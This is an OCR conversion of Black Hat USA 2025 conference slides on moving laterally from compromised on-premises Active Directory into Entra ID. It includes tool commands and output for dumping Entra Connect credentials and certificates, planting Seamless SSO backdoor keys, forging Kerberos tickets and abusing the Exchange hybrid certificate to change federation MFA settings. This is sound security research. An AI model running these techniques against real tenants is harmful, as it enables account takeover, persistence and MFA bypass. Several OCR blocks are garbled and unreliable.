---
title: "Advanced Active Directory to Entra ID Lateral Movement Techniques"
speakers: ["Dirk-jan Mollema"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Dirk-jan Mollema_Advanced Active Directory to Entra ID Lateral Movement Techniques.pdf"
pages: 85
sha256: "686f0112d28a8321ff26ee00dcf17b43005af26eee4fa74214474d681bb7ba5f"
text_chars: 32141
ocr_pages: 33
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.9
ocr_unreliable_blocks: 4
vision_verified_blocks: 7
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:09:33Z"
---
# Advanced Active Directory to Entra ID Lateral Movement Techniques

**Speakers:** Dirk-jan Mollema  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Dirk-jan Mollema_Advanced Active Directory to Entra ID Lateral Movement Techniques.pdf` (85 pages)


## Slide 1

# Advanced Active Directory to Entra ID lateral movement techniques

Dirk-jan Mollema

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS
AUGUST 6-7, 2025
MANDALAY BAY / LAS VEGAS
Advanced Active Directory to Entra ID
lateral movement techniques
Dirk-jan Mollema
```

## Slide 2

## About me

- Dirk-jan Mollema

- From The Hague, Netherlands

- Hacker / Researcher / Founder / Trainer @ Outsider Security

- Talks at Black Hat / DEF CON / BlueHat / Troopers / x33fcon

- Author of several Active Directory and Entra ID tools

   - mitm6

   - ldapdomaindump

   - adidnsdump

   - BloodHound.py

   - ntlmrelayx / krbrelayx

   - ROADtools

Socials Blog/talks: dirkjanm.io Twitter/X: @_dirkjan BlueSky: @dirkjanm.io

## Slide 3

## Agenda

- Domains in AD and in Entra ID

- Existing hybrid attacks

- Policies

- Exchange

## Slide 4

Domains

## Slide 5

## Domains in AD vs Entra

- Domains in Active Directory

   - Are logical containers with their own structure.

   - Are part of a forest of one or multiple domains, which acts as the security boundary.

- In Entra ID

   - Domains are custom domains that you can use for sending email or as a suffix for userPrincipalNames.

   - Entra has a flat structure, which means there is no difference between users in one domain versus another domain.

## Slide 6

## Domains in hybrid AD / Entra ID

- We can sync multiple AD domains / forests to the same tenant.

- All users from these domains will be “pooled” together in Entra ID.

- However, we can configure authentication (managed/federated) on **a per domain** basis.

   - This is what confuses people (including me).

- In Entra ID, there is no boundary between different custom domains.

- However, there is a difference between synced accounts and “cloudonly” accounts.

## Slide 7

## Entra ID – hybrid setup

Microsoft Entra Tenant – identity layer
Domain 1 Domain 2 Domain 3 Domain N
Managed Federated
(PHS) (AD FS) Entra ID
On-premises
Sync Sync Auth
AD DS 1 AD DS 2

## Slide 8

## Entra ID – hybrid attacks from AD

Entra ID – cloud only users
Entra ID – hybrid users
Domain 1 Domain 2
Managed Federated
(PHS) (AD FS) Entra ID
On-premises
Sync
Sync
Write password Issue auth tokens
AD DS 1 AD DS 2

## Slide 9

## Hybrid domain compromise

Entra ID – cloud only users
Entra ID – hybrid users
Domain 1 Domain 2
Managed Federated
(PHS) (AD FS) Entra ID
On-premises
Sync
Sync
Write password Issue auth tokens
AD DS 1 AD DS 2

Compromising any hybrid auth material in the tenant allows attackers to authenticate as any hybrid user in Entra ID

## Slide 10

Hybrid attacks

## Slide 11

Starting point = full control over on-prem AD

## Slide 12

## Known hybrid attacks

- Configuration dependent attacks:

   - AD FS compromise allowing forged SAML tokens.

   - Seamless SSO compromise allowing forged Kerberos Tickets (silver tickets).

- Entra ID connect based attacks:

   - Password overwrite via compromised Entra ID connect server.

   - Adding credentials to service principals via Entra ID connect.

   - Converting cloud-only accounts to hybrid accounts.

## Slide 13

## AD FS and forging SAML tokens

Issue SAML tokens
Microsoft Entra ID
AD FS server
Attacker Forge SAML tokens
On-premises Cloud

## Slide 14

## Seamless SSO and forging Kerberos tickets

Issue Kerberos service tickets
Microsoft Entra ID
Domain Controller
Attacker Forge Kerberos ST
(silver ticket)
On-premises Cloud

## Slide 15

## Forging tokens / tickets

- AD FS token forging (Golden SAML) and Seamless SSO ticket forging are quite similar conceptually.

- Compromise authentication material on-premises, use it to auth to the cloud.

- • Main difference:

   - AD FS can issue MFA claims, **bypass MFA** on the Entra ID side.

   - Mitigations exist by refusing MFA claims from SAML tokens.

   - Seamless SSO is **only** a replacement for the **password.**

- Both methods are not isolated to a specific domain.

- Every AD FS token signing cert and every Seamless SSO key works for **all domains** in your tenant.

- Allows for impersonation of any synced account (not cloud-only accounts).

## Slide 16

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Seamless SSO Impersonate hybrid user
AD FS

## Slide 17

## Convert cloud-only user to hybrid user

Entra ID – cloud only users
Entra ID – hybrid users
Domain 1 Domain 2
Managed Federated
(PHS) (AD FS) Entra ID
On-premises
Sync
Sync
Write password Issue auth tokens
AD DS 1 AD DS 2

## Slide 18

## Convert cloud-only user to hybrid user

- Was possible for any account back in 2018

- Through “soft matching”:

   - Takeover is based on userPrincipalName or proxyAddress attributes.

   - Create fake user on-prem with same attribures, will be matched to cloud account.

   - After soft matching account is treated as hybrid.

- Solved for Global Administrators

- Never solved for Eligible roles

   - Eligible GA can be taken over.

- Mitigation: block soft matching / hard matching in Entra ID.

## Slide 19

## Dumping Entra ID connect credentials

Tools: https://github.com/dirkjanm/adconnectdump


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Dumping Entra ID connect credentials
PS C:\Program Files\Microsoft Azure AD Sync\Bin> .\ADSyncDecrypt.exe
Opening database Data Source=(Local1DB)\.\ADSync2019;Initial Catalog=ADSync;Connect Timeout=30
IS-1-5-32-544
oken number is: 1452
indows ID Name is: NT AUTHORITY\SYSTEM
IS-1-5-80-3245704983 - 3664226991 - 764670653 -2504430226-901976451
oken number is: 1492
indows ID Name is: NT SERVICE\ADSync
onfiguration XML:
<primary_class_mappings>
<mapping>
<primary_class>contact</primary_class>
<oc-value>contact</oc-value>
</mapping>
type="encrypted-string” use="connectivity” dataType="String” encrypted="1"
ppings /></MAConfig>
Decrypted configuration XML:
encrypted-attributes>
<attribute name="Password”™ >w618Q~bh@thDHRYQBNhEgGVNQeBZtnQU454/jBbBdwWJigHrU
hwSppZoBGmiA53UaHj rMUpZ9GmgqGxnt6ZD76xfKc-r</attribute>
/encrypted-attributes>
Tools: https://github.com/dirkjanm/adconnectdump
```

## Slide 20

Dumping the certificate with private key


> Recovered by OCR — confidence 90/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Dumping the certificate with private key
p\aaconnectdump> .\ADSyncCertDump.exe 78195CB5E6E1BFE8565F29CDE02C235137CD6EF5 394
Found certificate: CN=Entra Connect Sync Provisioning
BEGIN CERTIFICATE
MCoxKDAmBgNVBAMTHOVu
DQEBAQUAA4 IBDWAWggEK
+WKZ0Q70agp1odFKAh7w
END CERTIFICATE
Found CNG key with name: b15acb37-49e1-4257-931c-97d70aa28eb2
Key Name: 4f529f076fbc6269c552e37ccb33d93d_f98da564-d972-4394-8dd1-84bd831ec517
Provider: Microsoft Software Key Storage Provider
Algorithm Group: RSA
Exporting software based private key
BEGIN PRIVATE KEY
```

## Slide 21

TPM based private key


> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TPM based private key
END CERTIFICATE
Found CNG key with name: 0f0159e8-0997-U1c0—-9898-390U0ea23097
Key Name: C:\WINDOWS\ServiceProfiles\ADSync\AppData\Local\Microsoft\Crypto\PCPKSP\53601a9d6faaS3cbea626fa853d8eb58el9eb13c\89eall
Provider: Microsoft Platform Crypto Provider
Algorithm Group: RSA
Loading TPM based key for assertion signing
Authentication assertion for roadtx
Qi0iJodHRwezovL2xvZ2LuLm1pY3Jvc29mdt
```

## Slide 22

## What’s an assertion anyway

- Signed JWT issued by the app

## Slide 23

Expires when exactly?


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Expires when exactly?
Claim Value Description
type
aud https: // The "aud" (audience) claim identifies the recipients that the JWT is
login.microsoftonline.com/ intended for (here Microsoft Entra ID) See RFC 7519, Section 4.1.3%.
{tenantId}/oauth2/v2.@/token In this case, that recipient is the login server
(login.microsoftonline.com).
exp 1601519414 The "exp" (expiration time) claim identifies the expiration time on or
after which the JWT must not be accepted for processing. See RFC
7519, Section 4.1.4. This allows the assertion to be used until then,
so keep it short - 5-10 minutes after nbf at most} Microsoft Entra ID
doesn't place restrictions on the exp time currently.
```

## Slide 24

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Modify policies
Seamless SSO Impersonate hybrid user
AD FS

## Slide 25

Entra Connect Sync - Entra ID rights


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
entra Connect Sync - Entra ID rights
Directory Synchronization Accounts
Do not use. This role is automatically assigned to the Azure AD Connect service, and is not intended
or supported for any other use.
microsoft.directory/policies/create Create policies in Azure AD
microsoft.directory/policies/delete Delete policies in Azure AD
microsoft.directory/policies/standard/read Read basic properties on policies
microsoft.directory/policies/owners/read Read owners of policies
microsoft.directory/policies/policyAppliedTo/read Read policies.policyAppliedTo property
microsoft.directory/policies/basic/update Update basic properties on policies
microsoft.directory/policies/owners/update Update owners of policies
```

## Slide 26

Policies?

## Slide 27

## Policies – in my favorite Graph API

graph.microsoft.com

graph.windows.net api-version=1.61-internal

## Slide 28

## Conditional Access policies

- The policies endpoint contains all Conditional Access policies.

- Could be modified by the Entra Connect Sync account.

- Could add exclusions or just disable/delete entire policy

- Disclosed in 2019

- Patched in December 2023

## Slide 29


> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PATCH
Params @
none
Authorization @ Headers (10) Body @ Pre-request Script Tests Settings
form-data x-www-form-urlencoded ™®raw binary GraphQL JSON v
"objectType": "Policy",
"deletionTimestamp": null,
"displayName": "test CA",
"keyCredentials": [],
"policyType": 18,
"policyDetail": [
"S\"Version\":0,\"ModifiedDateTime\":\"2021-02-05T09:49:06.8467396Z\",\"State\":\"Enabled\",\"Conditions\":{\"Appli
Body Cookies Headers (18) Test Results
Pretty
b
b
Raw Preview Visualize JSON v >
"“odata.error": {
"code": "Authorization_RequestDenied",
"message": {
frvaiue": "Only confidential first party applications can Update MultiConditionalAccessPolicy objects."
"requestId": "b4e97772-d455-4723-b9b7-d91663a16427",
"date": "2025-07-22T18:45:58"
```

## Slide 30

## Other policies

- On-Premise Authentication Flow Policy

- Password Management

- Default Policy (type 24)

- External Identities Policy

## Slide 31

## Other policies

- On-Premise Authentication Flow Policy

   - Seamless SSO settings and Pass Through Auth config

- Password Management

   - SSPR policy

- Default Policy (type 24)

   - Authentication methods policy

- External Identities Policy

   - B2B collaboration settings

## Slide 32


> Recovered by OCR — confidence 83/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
: "https://graph.windows.net/myorganization/Smetadata#directoryObjects/@Element",
: "Microsoft.DirectoryServices.Policy",
: "Policy",
"
: "On-Premise Authentication Flow Policy",
: "2124-03-28T14:10:42.4759214Z",
: "2025-03-28T14:10:42.4759214Z",
: "Symmetric",
: "Decrypt",
: "2124-03-28T14:10:42.4899169Z",
: "a985f2ae-ff07-417c-a411-66bc1e3b62aa",
: "2025-03-28T14:10:42.4899169Z",
: "Symmetric",
: "Decrypt",
```

## Slide 33


> Recovered by OCR — confidence 83/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
true,
: false,
"a3ad103a-f4e4-422a-9eaf-c139b2c781c7",
F2ae-ff07-417c-a411-66bc1e3b62aa"
```

## Slide 34

## Seamless SSO configuration

- _keyCredentials_ hold the symmetric Kerberos encryption keys.

- • 2 per domain (plus old keys if rotated recently)

- What key format to use? No examples or logging. • Attempted:

   - 1: NT hash 2: AES256 key

   - 1: plain password 2: salt

- Combinations switched around + base64 encoding etc

- • Combination that worked:

   - Plain password / key in both keys

   - Accepts RC4 encrypted Kerberos SSO ticket

## Slide 35

## Adding Seamless SSO backdoor keys

- Add our own chosen key to the list.

- Can add keys to existing domain but they will be rotated out or break existing seamless SSO.

- Can also add it to a **.onmicrosoft.com** domain

   - Doesn’t make any sense, but works.

   - Can use any key for any domain anyway, so doesn’t matter which domain we provision it on.

## Slide 36


> Recovered by OCR — confidence 76/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
"iminvourcloud.onmicrosoft.com".
337-ab99-4d21-9c03-
: "2eaf516a-15f5-4131-8815-030edb08fe4f",
371337 46
371337-ab99- 4d21. 9c03- ed47895 11d0
: "13
: 0
oow
: "13371337-ab99-4d21-9c03-ed4789511d02"
AZUREADSSOACC'
```

## Slide 37

## Audit logs?

### • No

## Slide 38

Authenticating with backdoor key


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Authenticating with backdoor key
(roadtools_ hybrid) > roadtools_hybrid X ticketer.py -domain hybrid.iminyour.cloud -nt
hash Sredactedkey -spn http/autologon.microsoftazuread-sso.com -domain-sid S-1-5-21-1414223725-18
88795230-1473887622 -user-id 1107 hybrid >/dev/null 2>&1
(roadtools_ hybrid) > roadtools_hybrid X python krbsso.py hybrid.ccache | roadtx deskt
opsso -u hybrid@hybrid.iminyour.cloud --krbtoken stdin -t iminyour.cloud
Tokens were written to .roadtools auth
```

## Slide 39

## Other policies

- On-Premise Authentication Flow Policy

   - Seamless SSO settings and Pass Through Auth config

- Password Management

   - SSPR policy

- Default Policy (type 24)

   - Authentication methods policy

- External Identities Policy

   - B2B collaboration settings

## Slide 40

External Authentication Methods


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
External Authentication Methods
» Authentication methods | Policies
iminyourcloud - Microsoft Entra ID Security
[© Search x « -+ Add external method (Preview) C) Refresh a Got feedback?
\v Manage
Method Target Enabled
Policies
\ Built-In
Password protection
Passkey (FIDO2) All users Yes
LL, Registration campaign
Microsoft Authenticator All users Yes
© Authentication strengths
SMS No
Settings
Email OTP No
\v Monitoring
Certificate-based authentication No
44 Activity
" QR code No
S) User registration details
\ External (Preview)
Registration and reset
a events Not a real MFA provider 1 group Yes
| Bulk operation results po
```

## Slide 41

## EAM MFA bypass

- We can provision a new EAM by modifying the authentication methods policy.

- We can fake the MFA with roadoidc.

- Logs don’t actually tell us anything useful…

Ref: Bringing your own Identity Provider to Entra ID for Persistence and MFA Bypasses – https://dirkjanm.io/talks

## Slide 42

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Modify policies
Seamless SSO
Configure SSSO / EAM
AD FS Impersonate hybrid user

## Slide 43

## Hardening of Sync account permissions

- In August 2024 Microsoft changed the permissions.

- Sync account no longer has permissions to modify objects via Graph API’s.

- Techniques remain valid for post-compromise backdoors.

## Slide 44

Entra ID Connect Seamless SSO AD FS

Modify synced user passwords Modify service principals Convert cloud-only user to hybrid Modify policies Configure SSSO / EAM Impersonate hybrid user

## Slide 45

Exchange

## Slide 46

Exchange hybrid on-prem = Exchange online

## Slide 47

Exchange online = Global Admin

## Slide 48

## Exchange hybrid

- Exchange on-prem has a certificate credential that is used to authenticate to Exchange online and used to allow OAuth in hybrid scenarios.

- Is configured on the Exchange online service principal.

- Can be used for client authentication.

## Slide 49

Exporting the certificate


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exporting the certificate
i certlm - [Certificates - Local Computer\Personal\Certificates]
File Action View Help
Gd Certificates - Local Computer Issued To Issued By Expiration Date —_ Intended Purposes Friendly Name Status Certificate Tem...
_| Trusted Root Certification Aut
| Enterprise Trust
| Intermediate Certification Aut
‘| Trusted Publishers
‘| Untrusted Certificates
“| Third-Party Root Certification
_. Trusted People
_| Client Authentication Issuers
Al Hybrid-Exchange Hybrid-Exchange 7/5/2029 Server Authentication Microsoft Exchange
= Microsoft Exchange Server Auth Certificate | Microsoft Exchange Server Aut! 6/9/2029 Server Authentication Microsoft Exchange ...
_| Preview Build Roots
_| Test Roots
_ AAD Token Issuer
_| Smart Card Trusted Roots
```

## Slide 50


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ut
ut
an
lla
A Hybrid-Exchange Hybrid-Exchange
11 Microsoft Exchange Server Auth
cA WMSvc-SHA2-HYBRID-EXCHANG Open
Cut
Copy
Delete
Properties
Help
7/5/2029 Server Authet
xchange Server Auth C.. 6/9/2029
4YBRID-EXCHANGE = 7/3/2034 Server Auther
Open
Request Certificate with New Key...
Renew Certificate with New Key...
Manage Private Keys...
Advanced Operations >
Export...
```

## Slide 51


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© 3 Certificate Export Wizard
Export Private Key }
You can choose to export the private key with the certificate.
Private keys are password protected. If you want to export the private key with the
certificate, you must type a password on a later page.
Do you want to export the private key with the certificate?
® Yes, export the private key
~) No, do not export the private key
Next Cancel
```

## Slide 52


> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
(ROADtools) > ROADtools X roadtx appauth -c 00000002 -0000-0ff1-ced0-0000
lert-pem certpoc.pem
Requesting token with scope https://graph.microsoft.com/.default offline_access
Tokens were written to .roadtools_auth
(ROADtools) > ROADtools X roadtx describe
{
-t iminyour.cloud -s "msgraph/.default offline_access" --cae --key-pem certpoc.key --c
"alg": "RS256",
"nonce": "pCOKCCXc1uFFNEKrntujc_OvDp7NL9-TWZT-Xn2mgAo",
"typ": "JWT",
"app_displayname": "Office 365 Exchange Online",
"appidacr": "2",
"aud": "https://graph.microsoft.com",
"exp": 1752827614,
"{at": 1752740914,
"idtyp": "app",
"nbf": 1752740914,
"oid": "a761cbb2-fbb6-4c80-aa50-504962316eb2",
"roles": [
"Policy.Read.ALL",
"tenant_region_scope": "EU",
"tid": "6287f28f-4f7f-4322-9651-a8697d8fe1bc",
"uti": "4gGDBZpFVOK6viqcuEUIAA",
"ver": "1.0",
wids": [
1,
"xms_cc": [
]
"xms_ftd": "VpL4YAiaT6yPLEN2c_Slm6c8XDrqGoDjK1Pa300RIOMBc3d1ZGVuYy1kc21z",
"xms_idrel": "7 28",
"xms_spcu": "true",
"xms_tcdt": 1573808047,
"xms_tdbr": "EU"
+
(ROADtools) > ROADtools x
```

## Slide 53

## Domain.ReadWrite.All

- Allows us to configure custom domains.

- Removing / adding domains.

- Modifying the federation information on domains.

- Modify the federation token signing certificate.

## Slide 54


> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(ROADtools) > ROADtools X roadtx appauth -c 00000002-0000-0ff1-ce00-000000000000 -t iminyour.cloud -s "msgrap|
h/.default offline_access" --key-pem certpoc.key --cert-pem certpoc.pem
Requesting token with scope https://graph.microsoft.com/.default offline_access
Tokens were written to .roadtools_auth
(ROADtools) > ROADtools X roadtx graphrequest 'https://graph.microsoft.com/v1.0/domains/federated.iminyour.cl
loud/federationConfiguration'
{
"@odata.context": "https://graph.microsoft.com/v1.0/$metadata#domains('federated.iminyour.cloud')/federationConfigurati
"value": [
{
"displayName": "sts.federated.iminyour.cloud",
"metadataExchangeUri": "https://sts.federated.iminyour.cloud/adfs/services/trust/mex",
SS/TUveKb",
"passiveSignInUri": "https://sts.federated.iminyour.cloud/adfs/ls/",
"preferredAuthenticationProtocol": "wsFed",
"signOutUri": "https://sts.federated.iminyour.cloud/adfs/ls/",
"promptLoginBehavior": "",
"isSignedAuthenticationRequestReaquired": null
"nextSigningCertificate": null,
"federatedIdpMfaBehavior": "rejectMfaByFederatedIdp",
"signingCertificateUpdateStatus": {
"certificateUpdateResult": "Success",
"LastRunDateTime": "2024-08-03T14:58:50.7853744Z"
```

## Slide 55

Patch federation config


> Recovered by OCR — confidence 76/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Patch federation config
(ROADtools) > ROADtools X roadtx graphrequest 'https://graph.microsoft.com/v1.0/domains/federated.iminyour.cl
oud/federationConfiguration/b27183e1 -0e89 -4a3d-ad1a-a0587edf6fcO?$select=federatedIdpMfaBehavior' > fedconf.json
(ROADtools) > ROADtools X roadtx graphrequest 'https://graph.microsoft.com/v1.0/domains/federated.iminyour.cl
oud/federationConfiguration/b27183e1 -0e89-4a3d-ad1a-a0587edf6fcO' -df fedconf.json -m PATCH
204
(ROADtools) — ROADtools X roadtx graphrequest 'https://graph.microsoft.com/v1.0/domains/federated.iminyour.cl
{
"@odata.context": "https://graph.microsoft.com/v1.0/Smetadata#domains('federated.iminyour.cloud')/federationConfigurati
}
(ROADtools) —- ROADtools x
"federatedIdpMfaBehavior":] "acceptIfMfaDoneByFederatedIdp"
```

## Slide 56

Entra ID Connect Seamless SSO AD FS Exchange

Modify synced user passwords Modify service principals Convert cloud-only user to hybrid Modify policies Configure SSSO / EAM Impersonate hybrid user Configure federation config

## Slide 57

Test our hybrid setup


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Test our hybrid setup
Version Learn / ExchangePowerShell / organization / Ask Learn
Exchange PowerShell Vv | .
Set-PerimeterConfig A Module: ExchangePowerShell
Applies to: Exchange Server 2013, Exchange Server 2016, Exchange Server 2019, Exchange Online
Set-ServicePrincipal
Set-SettingOverride This cmdlet is available in on-premises Exchange and in the cloud-based service. Some parameters
Test-ApplicationAccessPolicy and settings may be exclusive to one environment or the other.
Test-OAuthConnectivity
Use the Test-OAuthConnectivity cmdlet to test OAuth authentication to partner applications for a
Test-ServicePrincipalAuthorization
user.
Test-SystemHealth
Update-ExchangeHelp For information about the parameter sets in the Syntax section below, see Exchange cmdlet syntax.
```

## Slide 58

Testing OAuth connectivity


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Testing OAuth connectivity
(A Machine: Hybrid-Exchange.hybrid.iminyour.cloud
[PS] C:\Windows\system32>Test-OAuthConnectivity
Task ResultType
Checking EWS API Call Under Oauth Success
```

## Slide 59


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Client request ID: af0b9e1c-304d-4cbe-8e59-57cc92c12dc3
Information:[OAuthCredentials:Authenticate] entering
Information:[OAuthCredentials:Authenticate] challenge from 'https://outlook.office365.com/ews/Exchange.asmx' received: Bearer client_id="00000002-0000-0ff1-ce00-000000000000", trusted_issuers="00000001-0000-0000-c000-000000000000@*", token_types="app_asserted_user_v1 service_asserted_app_v1", authorization_uri="https://login.microsoftonline.com/common/oauth2/authorize",Basic Realm=""
Information:[OAuthCredentials:GetToken] client-id: '00000002-0000-0ff1-ce00-000000000000', realm: '', trusted_issuer: '00000001-0000-0000-c000-000000000000@*'
Information:[OAuthCredentials:GetToken] Start building a token using organizationId ''
Information:[OAuthTokenBuilder:GetAppToken] start building the apptoken
Information:[OAuthTokenBuilder:GetAppToken] checking enabled auth servers
Information:[OAuthTokenBuilder:GetAppToken] trusted_issuer includes the auth server 'ACS - 68269e62-048f-4804-b5fa-af63c14b65e4' ( having DomainName : System.Collections.Generic.List`1[System.String] ): 00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc,
Information:[OAuthTokenBuilder:GetAppToken] updating the tenant id with the auth server realm; current tenant id value is '', new value is '6287f28f-4f7f-4322-9651-a8697d8fe1bc'
Information:[OAuthTokenBuilder:GetAppToken] trying to get the apptoken from the auth server 'ACS - 68269e62-048f-4804-b5fa-af63c14b65e4' for resource '00000002-0000-0ff1-ce00-000000000000/outlook.office365.com@6287f28f-4f7f-4322-9651-a8697d8fe1bc', tenantId '6287f28f-4f7f-4322-9651-a8697d8fe1bc', userDomain 'hybrid.iminyour.cloud'
```

## Slide 60

Actor token?


> Recovered by OCR — confidence 78/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Actor token?
Information: [TokenBuildRequest :GetActorTokenFromAuthServer ]} Sending token request to ‘https://accounts
-accesscontrol.windows.net/6P87f28f -4F7f-4322-9651-a8697d8felbc/tokens/OAuth/2' for the resource '00e@
IcBsx@yjogEViPB912pP1a935ZGTDdWbbAdNY_Aio-b_mr2GVnTkqopjIfT1G38cYCfrfSRhuMIOWIu6t7icfarDsS6L4m2jdC-SJo
a8697d8felbc
```

## Slide 61

Another token?


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Another token?

Information:[OAuthCredentials:Authenticate] send request to 'https://outlook.office365.com/ews/Exchange.asmx' with the bearer token: '{"typ":"JWT","alg":"none"}."iss": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc" "aud": "00000002-0000-0ff1-ce00-000000000000/outlook.office365.com@6287f28f-4f7f-4322-9651-a8697d8fe1bc" "nbf": "1753216953" "exp": "1753245753" ; actor: {"typ":"JWT","alg":"RS256","x5t":"_jNwjeSnvTTK8XEdr5QUPkBRLLo","kid":"_jNwjeSnvTTK8XEdr5QUPkBRLLo"}."oid": "a761cbb2-fbb6-4c80-aa50-504962316eb2" "iss": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc" "aud": "00000002-0000-0ff1-ce00-000000000000/outlook.office365.com@6287f28f-4f7f-4322-9651-a8697d8fe1bc" "nbf": "1753216653" "exp": "1753303353" '
```

## Slide 62

## Slide 63

Access Control Service (ACS)
Microsoft Entra ID
Request actor token
ACS
Issue actor token
Exchange hybrid on-prem
Send actortoken, impersonate Bob
Send actortoken, impersonate Alice
Exchange online
Send actortoken, impersonate *

## Access Control Service (ACS)

OSINT: https://accounts.accesscontrol.windows.net/microsoft.com/metadata/json/1

## Slide 64

Actor tokens


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Actor tokens

(ROADtools) ➜  pocs git:(master) ✗ roadtx describe -f .roadtools_actortoken
{
    "alg": "RS256",
    "kid": "_jNwjeSnvTTK8XEdr5QUPkBRLLo",
    "typ": "JWT",
    "x5t": "_jNwjeSnvTTK8XEdr5QUPkBRLLo"
}
{
    "aud": "00000002-0000-0ff1-ce00-000000000000/outlook.office.com@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "exp": 1753305230,
    "iat": 1753218530,
    "identityprovider": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "iss": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nbf": 1753218530,
    "oid": "a761cbb2-fbb6-4c80-aa50-504962316eb2",
    "sub": "a761cbb2-fbb6-4c80-aa50-504962316eb2",
    "trustedfordelegation": "true",
    "xms_spcu": "true"
}
```

## Slide 65

Unsigned bearer token sent to Exchange online


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 87/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Unsigned bearer token sent to Exchange online

{
    "alg": "none",
    "typ": "JWT"
}
{
    "actortoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Il9qTndqZVNudlRUSzhYRWRyNVFVUGtC
QiOiIwMDAwMDAwMi0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvb3V0bG9vay5vZmZpY2UuY29tQDYyODdmMjhmLTRmN
MDAwMC1jMDAwLTAwMDAwMDAwMDAwMEA2Mjg3ZjI4Zi00ZjdmLTQzMjItOTY1MS1hODY5N2Q4ZmUxYmMiLCJpYXQiOjE3NTM
l0eXByb3ZpZGVyIjoiMDAwMDAwMDEtMDAwMC0wMDAwLWMwMDAtMDAwMDAwMDAwMDAwQDYyODdmMjhmLTRmN2YtNDMyMi05N
ZTAwLTAwMDAwMDAwMDAwMEA2Mjg3ZjI4Zi00ZjdmLTQzMjItOTY1MS1hODY5N2Q4ZmUxYmMiLCJvaWQiOiJhNzYxY2JiMi1
